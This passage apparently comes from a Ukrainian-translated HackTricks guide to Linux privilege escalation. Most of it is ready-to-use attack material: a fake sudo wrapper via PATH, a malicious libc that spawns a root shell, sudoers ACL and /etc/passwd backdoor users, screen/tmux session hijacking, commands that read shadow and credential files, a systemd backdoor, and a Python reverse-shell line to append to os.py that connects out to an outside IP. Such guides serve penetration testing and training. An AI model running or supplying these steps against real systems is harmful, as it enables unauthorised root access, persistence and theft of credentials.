Зверніть увагу, що якщо користувач використовує інший shell (не bash), вам потрібно змінити інші файли, щоб додати новий шлях. Наприклад[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустивши щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки завантажуються конфігураційні файли**. Зазвичай цей файл містить такий рядок: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть зчитані конфігураційні файли з `/etc/ld.so.conf.d/*.conf`. Ці конфігураційні файли **вказують на інші папки**, де **бібліотеки** будуть **шукатися**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — це `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки в `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права на запис** в будь-якому із зазначених шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-який файл всередині `/etc/ld.so.conf.d/` або будь-яка папка, вказана в конфігураційному файлі `/etc/ld.so.conf.d/*.conf`, — він може отримати підвищені привілеї.\
Перегляньте, **як експлуатувати цю неправильну конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Копіювавши lib у `/var/tmp/flag15/`, вона буде використана програмою в цьому місці, як зазначено у змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities забезпечують **підмножину доступних привілеїв root для процесу**. Це фактично розбиває привілеї root **на менші й відмінні одиниці**. Кожну з цих одиниць можна потім незалежно надавати процесам. Таким чином повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Прочитайте наступну сторінку, щоб **дізнатися більше про capabilities та як їх зловживати**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Права доступу до директорії

У каталозі біт для **"execute"** означає, що відповідний користувач може **"cd"** у папку.\
Біт **"read"** означає, що користувач може **list** **files**, а біт **"write"** означає, що користувач може **delete** та **create** нові **files**.

## ACLs

Access Control Lists (ACLs) представляють вторинний шар дискреційних дозволів, здатний **перевизначати традиційні ugo/rwx permissions**. Ці дозволи підвищують контроль доступу до файлу або директорії, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або частиною групи. Такий рівень **granularity забезпечує більш точне управління доступом**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Дайте** користувачу "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACLs із системи:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Прихований ACL backdoor у sudoers drop-ins

Поширеною неправильною конфігурацією є root-owned файл у `/etc/sudoers.d/` з mode `440`, який усе ще надає write access low-priv user через ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Якщо ви бачите щось на кшталт `user:alice:rw-`, користувач може додати sudo rule незважаючи на обмежувальні біти режиму:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Це шлях високого впливу для ACL persistence/privesc, оскільки його легко пропустити під час оглядів лише з `ls -l`.

## Відкриті shell sessions

У **старих версіях** ви можете **hijack** певну **shell** сесію іншого користувача (**root**).\
У **новіших версіях** ви зможете **connect** до screen sessions лише свого користувача. Однак ви можете знайти **цікаву інформацію всередині сесії**.

### screen sessions hijacking

**Перелік screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Це була проблема зі **старими версіями tmux**. Мені не вдалося hijack сесію tmux (v2.1), створену root, будучи непривілейованим користувачем.

**Перелік сесій tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перевірте **Valentine box from HTB** для прикладу.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Всі SSL і SSH ключі, згенеровані на системах, що базуються на Debian (Ubuntu, Kubuntu, тощо) між вереснем 2006 і 13 травня 2008 року, можуть бути уражені цим багом.\
Цей баг виникає при створенні нового ssh ключа в тих ОС, оскільки було можливих лише **32,768 варіацій**. Це означає, що всі можливості можна обчислити, і **маючи ssh public key ви можете шукати відповідний private key**. Ви можете знайти обчислені можливості тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Вказує, чи дозволена аутентифікація паролем. За замовчуванням `no`.
- **PubkeyAuthentication:** Вказує, чи дозволена аутентифікація за public key. За замовчуванням `yes`.
- **PermitEmptyPasswords**: Коли аутентифікація паролем дозволена, цей параметр визначає, чи дозволяє сервер входи до акаунтів з пустими рядками паролів. За замовчуванням `no`.

### Login control files

Ці файли впливають на те, хто може увійти та як:

- **`/etc/nologin`**: якщо присутній, блокує входи не-root та виводить своє повідомлення.
- **`/etc/securetty`**: обмежує, звідки root може входити (TTY allowlist).
- **`/etc/motd`**: банер після входу (може leak інформацію про середовище або деталі обслуговування).

### PermitRootLogin

Визначає, чи може root входити через ssh, за замовчуванням `no`. Можливі значення:

- `yes`: root може входити, використовуючи пароль і private key
- `without-password` or `prohibit-password`: root може входити лише за допомогою private key
- `forced-commands-only`: root може входити лише за допомогою private key і якщо вказані опції команд
- `no`: заборонено

### AuthorizedKeysFile

Визначає файли, що містять public keys, які можуть бути використані для аутентифікації користувача. Він може містити токени типу `%h`, який буде замінений на домашній каталог. **Ви можете вказати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (without passphrases!) залишати їх на сервері. Отже, ви зможете **jump** via ssh **to a host** і звідти **jump to another** host **using** the **key** located in your **initial host**.

Потрібно встановити цю опцію в `$HOME/.ssh.config` так:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` є `*`, то щоразу, коли користувач підключається до іншої машини, ця машина зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перезаписувати** ці **опції** та дозволяти або забороняти цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — дозволено).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете зловживати цим для ескалації привілеїв**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` і файли в директорії `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає новий shell**. Тому, якщо ви можете **записати або змінити будь-який із них, ви можете підвищити привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено підозрілий скрипт профілю, перевірте його на наявність **чутливих даних**.

### Passwd/Shadow файли

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або можуть існувати їхні резервні копії. Тому рекомендовано **знайти всі такі файли** та **перевірити, чи можна їх прочитати**, щоб з'ясувати, **чи містять файли хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
В окремих випадках можна знайти **password hashes** у файлі `/etc/passwd` (або еквівалентному).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Потім додайте користувача `hacker` і встановіть згенерований пароль:

```
sudo useradd -m hacker
echo 'hacker:v7$Tq9#rP2uQ8xH!' | sudo chpasswd
```

Згенерований пароль: v7$Tq9#rP2uQ8xH!
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з `hacker:hacker`

Альтернативно, ви можете скористатися наведеними нижче рядками, щоб додати фіктивного користувача без пароля.\ УВАГА: це може погіршити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: У BSD-платформах `/etc/passwd` знаходиться в `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано на `/etc/spwd.db`.

Вам слід перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в який-небудь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині працює сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat у /etc/systemd/,** то ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor буде виконаний наступного разу, коли tomcat буде запущено.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Можливо, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивне розташування/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Файли Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять passwords

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити passwords**.\
**Ще один цікавий інструмент**, який ви можете використати для цього, — [**LaZagne**](https://github.com/AlessandroZ/LaZagne), яка є програмою з відкритим кодом для вилучення великої кількості passwords, що зберігаються на локальному комп'ютері для Windows, Linux & Mac.

### Logs

Якщо ви можете читати logs, можливо, ви зможете знайти в них **цікаву/конфіденційну інформацію**. Чим дивніший log, тим цікавішим він, ймовірно, буде.\
Також деякі "**bad**" налаштовані (backdoored?) **audit logs** можуть дозволити вам **записувати passwords** всередині audit logs, як пояснено в цій статті: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати логи**, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell файли
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ви також повинні перевіряти файли, у назві (**name**) або вмісті (**content**) яких міститься слово "**password**", а також шукати IPs та emails у логах або hashes regexps.\
Я не буду тут перераховувати, як усе це робити, але якщо вам цікаво, ви можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

If you know from **звідки** a python script is going to be executed and you **можете записувати в** that folder or you can **модифікувати python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Уразливість у `logrotate` дозволяє користувачам з **правами на запис** у файл журналу або у батьківські каталоги потенційно отримати підвищені привілеї. Це тому, що `logrotate`, який часто працює від імені **root**, можна маніпулювати для виконання довільних файлів, особливо в каталогах на кшталт _**/etc/bash_completion.d/**_. Важливо перевіряти права не лише в _/var/log_, а й у будь-якому каталозі, де застосовується ротація логів.

> [!TIP]
> Ця уразливість стосується версій `logrotate` `3.18.0` та старіших

Докладніша інформація про уразливість доступна на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Цю уразливість можна експлуатувати за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця уразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тому коли ви виявите, що можете змінювати логи, перевірте, хто ними керує, і чи можна ескалювати привілеї, замінивши логи символічними посиланнями.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з якоїсь причини користувач може **записати** скрипт `ifcf-<whatever>` у _/etc/sysconfig/network-scripts_ **або** може **змінити** існуючий, то ваша **system is pwned**.

Network scripts, _ifcg-eth0_ наприклад, використовуються для мережевих підключень. Вони виглядають точно як .INI файли. Однак вони \~sourced\~ у Linux Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` у цих мережевих скриптах обробляється некоректно. Якщо в імені є **пробіл, система намагається виконати частину після пробілу**. Це означає, що **все, що йде після першого пробілу, виконується від імені root**.

Для прикладу: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network та /bin/id_)

### **init, init.d, systemd та rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи керування сервісами Linux**. Він включає скрипти для `start`, `stop`, `restart`, а іноді й `reload` сервісів. Ці скрипти можна виконувати безпосередньо або через символічні посилання в `/etc/rc?.d/`. Альтернативний шлях у системах Redhat — `/etc/rc.d/init.d`.

Натомість `/etc/init` пов'язаний з **Upstart**, новішою системою **керування сервісами**, яка була впроваджена Ubuntu і використовує конфігураційні файли для задач керування сервісами. Незважаючи на перехід на Upstart, скрипти SysVinit все ще використовуються поряд з конфігураціями Upstart через шар сумісності в Upstart.

**systemd** постає як сучасний менеджер ініціалізації та сервісів, що пропонує розширені можливості, такі як запуск демона за вимогою, керування automount і знімки стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибутиву та `/etc/systemd/system/` для змін адміністраторів, спрощуючи процес адміністрування системи.

## Інші хитрощі

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай перехоплюють syscall, щоб надати привілейовану функціональність ядра userspace manager'у. Слабка автентифікація менеджера (наприклад, перевірки підписів, що залежать від порядку FD, або слабкі схеми паролів) може дозволити локальному застосунку видавати себе за менеджера та ескалювати привілеї до root на пристроях, які вже рутовані. Дізнайтесь більше та деталі експлуатації тут:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery у VMware Tools/Aria Operations може витягувати шлях до бінарника з командних рядків процесів і виконувати його з опцією -v у привілейованому контексті. Дозвільні шаблони (наприклад, використання \S) можуть співпасти з підготовленими атакуючим прослуховувачами у записуваних локаціях (наприклад, /tmp/httpd), що призводить до виконання від імені root (CWE-426 Untrusted Search Path).

Детальніше та узагальнену схему, застосовну до інших стеків discovery/monitoring, дивіться тут:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Більше допомоги

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Посилання

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
